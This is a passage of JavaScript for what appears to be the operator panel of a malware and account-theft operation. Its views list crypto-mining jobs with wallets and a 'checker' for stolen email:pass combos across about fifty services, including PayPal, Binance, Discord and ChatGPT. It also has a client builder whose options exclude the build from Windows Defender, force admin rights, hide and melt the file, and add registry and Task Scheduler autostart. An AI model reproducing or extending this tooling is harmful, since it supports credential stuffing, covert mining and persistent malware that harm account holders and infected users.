      [{ label: 'User', key: 'name' }, { label: 'Machine', key: 'pool' }, { label: 'Wallet', key: 'wallet' }, { label: 'Status', render: () => 'Idle' }],
      m.jobs, { checkbox: true, emptyText: 'No mining jobs.' }
    ));
  },

  checker: (root) => {
    root.innerHTML = '';
    const cats = ['All', 'Games', 'Emails', 'Socials', 'Marketplaces', 'Crypto', 'AI', 'Streaming', 'Other'];
    const catBar = el('div', { className: 'checker-cats' });
    cats.forEach((cat, i) => {
      const b = el('button', { className: i === 0 ? 'active' : '' }, [cat]);
      b.onclick = () => { catBar.querySelectorAll('button').forEach(x => x.classList.remove('active')); b.classList.add('active'); };
      catBar.appendChild(b);
    });
    root.appendChild(catBar);

    const search = searchBar('Search', () => {});
    root.appendChild(search.bar);

    const services = [
      ['Amazon', 'Email, Country, Balance, Orders', '#ff9900'],
      ['AOL Mail', 'Username, Email, Phone, Country', '#0060a9'],
      ['Avito', 'Email, Phone, Name, Balance', '#00a1ff'],
      ['BattleNet', 'Email, Balance, Transactions', '#148eff'],
      ['Binance', 'ID, Email, Country, Balance', '#f0b90b'],
      ['Booking', 'Email, Country, Level, Payments', '#003580'],
      ['Bybit', 'ID, Email, Country, Balance', '#f7a600'],
      ['ChatGPT', 'Email, Name, Plan, 2FA', '#10a37f'],
      ['Claude', 'Email, Plan, Billing, Expires At', '#d97757'],
      ['Coinbase', 'Email, Country, Balance, 2FA', '#1652f0'],
      ['Cursor', 'Email, Name, Plan, Usage', '#111827'],
      ['Discord', 'Username, Email, Nitro, Guilds', '#5865f2'],
      ['Dropbox', 'Email, Name, Plan, Storage Used', '#0061ff'],
      ['EA', 'Username, Email, Country, Created At', '#ff4747'],
      ['eBay', 'Username, Country, Orders, Feedback', '#e53238'],
      ['EFT', 'Username, Email, Owned, Banned', '#111'],
      ['Epic Games', 'Username, Email, Country, V-Bucks, Skins', '#2a2a2a'],
      ['EXBO', 'Username, Email, Game, Inventory', '#1e3a8a'],
      ['ExitLag', 'Email, Plan, Status', '#d42028'],
      ['Facebook', 'Name, Friends, Verified, Business, Country, Locale', '#1877f2'],
      ['FreeBitco.in', 'Email, BTC Address, Balance, 2FA', '#f7931a'],
      ['FunPay', 'Username, Balance, Sales, Purchases', '#ffce3d'],
      ['GitHub', 'Username, Email, Followers, Plan', '#111827'],
      ['GOG.com', 'Username, Email, Balance, Games', '#7b2eda'],
      ['Google', 'Name, Email, Country, 2FA', '#4285f4'],
      ['Grok', 'Name, Email, Plan, Subscription', '#111827'],
      ['Humble Bundle', 'Email, Country, Balance, Orders', '#d63030'],
      ['Hytale', 'Username, Email, Purchased, Edition', '#3b82f6'],
      ['iCloud', 'Email, Name, Plan, Storage', '#3693f3'],
      ['Instagram', 'Username, Email, Followers, Verified', '#e4405f'],
      ['Kick', 'Username, Email, Followers, Verified', '#53fc18'],
      ['Kleinanzeigen', 'Username, Email, City, Listings', '#111'],
      ['LinkedIn', 'Username, Email, Connections, Premium', '#0a66c2'],
      ['Loaded', 'Name, Email, Country, Orders', '#7c3aed'],
      ['MEXC', 'Email, Country, KYC, Balance', '#00c9a7'],
      ['miHoYo', 'Username, Email, Country, Games', '#5c9ee8'],
      ['Minecraft', 'Username, Email, Owned, Minecoins', '#62b47a'],
      ['Netflix', 'Name, Email, Country, Plan', '#e50914'],
      ['Nintendo', 'Email, Country, Balance, Orders', '#e60012'],
      ['Onet', 'Email, Country, Phone, Quota', '#ffcc00'],
      ['Outlook', 'Name, Email, Country, Inbox', '#0078d4'],
      ['PayPal', 'Email, Country, Balance, Cards', '#003087'],
      ['Playerok', 'Username, Email, Balance, Sales', '#2563eb'],
      ['Reddit', 'Username, Karma, Premium, Verified', '#ff4500'],
      ['Riot Games', 'Username, Email, Country, 2FA', '#d13639'],
      ['Roblox', 'Username, Email, Country, Robux, Premium', '#00a2ff'],
      ['Rockstar Games', 'Username, Email, Games', '#f8b700'],
      ['Seznam', 'Email, Name, Phone, Country', '#cc0000']
    ];
    const grid = el('div', { className: 'checker-grid' });
    services.forEach(([name, desc, color]) => {
      const card = el('div', { className: 'checker-card' });
      const head = el('div', { className: 'cc-head' });
      const logo = el('div', { className: 'cc-logo', style: `background:${color}` }, [name[0]]);
      head.appendChild(logo);
      const open = el('button', { className: 'btn icon' });
      open.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14 4h6v6M20 4l-9 9M5 5h5M5 19h14V10"/></svg>';
      head.appendChild(open);
      card.appendChild(head);
      card.appendChild(el('div', { className: 'cc-name' }, [name]));
      card.appendChild(el('div', { className: 'cc-desc' }, [desc]));
      const foot = el('div', { className: 'cc-foot' });
      const settings = el('button', { className: 'cc-settings' }, ['⚙ Settings']);
      settings.onclick = () => toast('Settings: ' + name);
      foot.appendChild(settings);
      const sw = el('label', { className: 'switch' });
      sw.appendChild(el('input', { type: 'checkbox' }));
      sw.appendChild(el('span', { className: 'slider' }));
      foot.appendChild(sw);
      card.appendChild(foot);
      grid.appendChild(card);
    });
    root.appendChild(grid);
  },

  checkersessions: (root) => {
    loadCollection('checkersessions');
    collectionView('checkersessions', root, [
      { label: 'Service', key: 'service' },
      { label: 'Combo', render: r => esc((r.combo || '').slice(0, 50)) },
      { label: 'Status', key: 'status' },
      { label: 'Checked', render: r => esc(r.createdAt || '') }
    ], {
      searchPlaceholder: 'Search sessions...',
      addLabel: 'Add Session',
      onAdd: () => addRowModal('checkersessions', [
        { key: 'service', label: 'Service' }, { key: 'combo', label: 'Combo (email:pass)' },
        { key: 'status', label: 'Status', type: 'select', options: ['Valid', 'Invalid', '2FA', 'Locked'] }
      ], 'Add Session')
    });
  },

  builder: async (root) => {
    const b = await api('/api/builder');
    root.innerHTML = '';
    const save = () => api('/api/builder', { method: 'POST', body: JSON.stringify(b) });

    function sec(title, rows) {
      const box = el('div', { className: 'sec' });
      const t = el('div', { className: 'sec-title' }, [title]);
      const chev = el('span', { className: 'chev' }, ['⌄']);
      t.appendChild(chev);
      box.appendChild(t);
      rows.forEach(row => {
        if (row.type === 'toggle') {
          const tr = el('div', { className: 'toggle-row' });
          const left = el('div');
          left.appendChild(el('div', { className: 'tr-label' }, [row.label]));
          if (row.sub) left.appendChild(el('div', { className: 'tr-sub' }, [row.sub]));
          tr.appendChild(left);
          const sw = el('label', { className: 'switch' });
          const cb = el('input', { type: 'checkbox' });
          const path = row.path.split('.');
          let val = b;
          path.forEach(p => val = val?.[p]);
          cb.checked = !!val;
          cb.onchange = () => {
            let obj = b;
            for (let i = 0; i < path.length - 1; i++) obj = obj[path[i]];
            obj[path[path.length - 1]] = cb.checked;
            save();
          };
          sw.appendChild(cb);
          sw.appendChild(el('span', { className: 'slider' }));
          tr.appendChild(sw);
          box.appendChild(tr);
        } else {
          const fr = el('div', { className: 'form-row' });
          fr.appendChild(el('label', {}, [row.label]));
          const path = row.path.split('.');
          let val = b;
          path.forEach(p => val = val?.[p]);
          const input = el('input', { value: val ?? '', placeholder: row.placeholder || '' });
          input.onchange = () => {
            let obj = b;
            for (let i = 0; i < path.length - 1; i++) obj = obj[path[i]];
            obj[path[path.length - 1]] = input.value;
            save();
          };
          fr.appendChild(input);
          box.appendChild(fr);
        }
      });
      return box;
    }

    root.appendChild(sec('General', [
      { label: 'Client Tag', path: 'clientTag' },
      { label: 'Note', path: 'note' },
      { label: 'Mutex', path: 'mutex' }
    ]));
    root.appendChild(sec('Options', [
      { label: 'Defender Exclusion', sub: 'Exclude the build from Windows Defender scans. This function requires administrator rights.', path: 'defenderExclusion', type: 'toggle' },
      { label: 'Force Admin', sub: 'This function requires administrator rights.', path: 'forceAdmin', type: 'toggle' },
      { label: 'Debug', sub: 'Open a console on the client and write client and plugin logs to it.', path: 'debug', type: 'toggle' }
    ]));
    root.appendChild(sec('Install', [
      { label: 'Enabled', path: 'install.enabled', type: 'toggle' },
      { label: 'Location', path: 'install.location' },
      { label: 'Folder', path: 'install.folder' },
      { label: 'Filename', path: 'install.filename' },
      { label: 'Hidden Attributes', path: 'install.hidden', type: 'toggle' },
      { label: 'System Attributes', path: 'install.system', type: 'toggle' },
      { label: 'Melt File', path: 'install.melt', type: 'toggle' },
      { label: 'Registry Autostart', path: 'install.registry', type: 'toggle' },
      { label: 'Task Scheduler Autostart', path: 'install.taskScheduler', type: 'toggle' }
    ]));

    const finalSec = el('div', { className: 'sec' });
    finalSec.appendChild(el('div', { className: 'sec-title' }, ['Final']));
    const cr = el('div', { className: 'form-row' });
    cr.appendChild(el('label', {}, ['Client']));
    const sel = el('select');
    ['exe', 'dll', 'py', 'ps1'].forEach(o => sel.appendChild(el('option', { value: o }, [o])));
    sel.value = b.final.client;
    sel.onchange = () => { b.final.client = sel.value; save(); };
    cr.appendChild(sel);
    finalSec.appendChild(cr);

    const buildBtn = el('button', { className: 'btn primary', style: 'width:100%;padding:0.75rem' }, ['Build Client']);
    buildBtn.onclick = async () => {
      const build = await api('/api/builder/build', { method: 'POST', body: '{}' });
      toast('Build created: ' + build.name);
      views.builder(root);
    };
    finalSec.appendChild(buildBtn);

    const acts = el('div', { style: 'display:flex;flex-direction:column;gap:0.4rem;margin-top:0.8rem' });
    ['✓ Save Settings', '⤓ Load Settings', '⤓ Download'].forEach(lbl => {
      const btn = el('button', { className: 'btn', style: 'width:100%' }, [lbl]);
      btn.onclick = () => toast(lbl);
      acts.appendChild(btn);
    });
    finalSec.appendChild(acts);

    finalSec.appendChild(el('div', { style: 'margin-top:1rem;color:#9ca3af;font-size:0.75rem' }, ['Archive password: 2478']));
    finalSec.appendChild(el('div', { style: 'margin-top:0.5rem;font-size:0.85rem;font-weight:600' }, ['Recent builds']));
    b.builds.forEach(bd => {
      finalSec.appendChild(el('div', { style: 'padding:0.6rem 0;border-bottom:1px solid #eef0f3;display:flex;justify-content:space-between;align-items:center' }, [
        el('div', {}, [
          el('div', { style: 'font-size:0.82rem' }, [bd.name]),
          el('div', { style: 'font-size:0.7rem;color:#9ca3af' }, [bd.createdAt + ' · ' + bd.size + ' · Guest.zip · CryptoManager.exe · password ' + bd.password])
        ])
      ]));
    });
    root.appendChild(finalSec);
  }
};

socket.on('push', ({ collection: col, item }) => {
  if (caches[col]) {
    caches[col].push(item);
    if (collectionRerender[col]) collectionRerender[col]();
  }
});
